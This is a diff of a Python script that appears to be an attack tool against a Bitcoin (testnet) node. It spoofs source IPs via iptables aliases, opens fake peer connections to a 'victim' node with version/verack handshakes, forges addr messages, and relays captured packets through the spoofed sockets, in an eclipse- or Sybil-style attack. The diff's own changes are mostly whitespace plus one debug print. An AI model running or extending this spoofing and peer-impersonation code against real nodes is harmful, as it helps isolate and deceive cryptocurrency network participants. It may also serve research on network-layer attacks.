@@ -32,7 +32,7 @@ def ip_alias(ip_address):
 	print(f'Setting up IP alias {ip_address}')
 	global alias_num
 	#terminal(f'sudo iptables -i {ip_alias_network_interface}:{alias_num} {ip_address} up')
-	
+
 	terminal(f'iptables -t nat -A PREROUTING -d {ip_address} -j DNAT --to-destination 0.0.0.0')
 
 	#terminal(f'iptables -A INPUT -p tcp -s {ip_address} -j ACCEPT')
@@ -132,7 +132,7 @@ def addr_packet(str_addrs):
 		addr.port = 18333
 		addr.nTime = int(time.time())
 		addr.ip = i
- 
+
 		addrs.append( addr )
 	msg.addrs = addrs
 	return msg
@@ -145,8 +145,8 @@ def initialize_fake_connection(src_ip, dst_ip):
 	dst_port = victim_port
 
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
-	
-	
+
+
 	"""seq = random.randrange(0,2**16)
 	ip = IP(src=src_ip, dst=dst_ip)
 	SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
@@ -167,7 +167,7 @@ def initialize_fake_connection(src_ip, dst_ip):
 
 	ip_alias(src_ip)
 
-	
+
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	#s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) #socket.AF_PACKET, socket.SOCK_RAW) #socket.AF_INET, socket.SOCK_STREAM)
 	#s.bind((src_ip, src_port))
@@ -182,21 +182,21 @@ def initialize_fake_connection(src_ip, dst_ip):
 	print('\n\n*** ')
 	print(s.recv(1924)) # Next message received must be <= 1924 bytes
 	# Send verack packet
-	
+
 	verack = msg_verack()
 	print(verack)
 	s.send(verack.to_bytes())
 	# Get verack packet
 	print('\n\n*** ')
 	print(s.recv(1024)) # Next message received must be <= 1024 bytes
-	
+
 
 	spoof_IP_and_ports.append((src_ip, src_port))
 	spoof_IP_sockets.append(s)
 
 	print('\n\n*** ')
 	print('CONNECTION ESTABLISHED')
-	
+
 	#time.sleep(5)
 	#s.close()
 	#print('CONNECTION CLOSED')
@@ -230,9 +230,11 @@ def packet_received(packet):
 				rand_port = spoof_IP_and_ports[rand_i][1]
 				rand_socket = spoof_IP_sockets[rand_i]
 
+				print(packet[TCP].payload)
 				print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
 				#packet[IP].src = rand_ip
 				#packet[IP].dst = victim_ip
+
 				try:
 					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
 					#rand_socket.send(custom.to_bytes())
@@ -285,7 +287,7 @@ def on_close():
 if __name__ == '__main__':
 	global alias_num
 	alias_num = 0 # Increments each alias
-	
+
 	initialize_network_info()
 
 
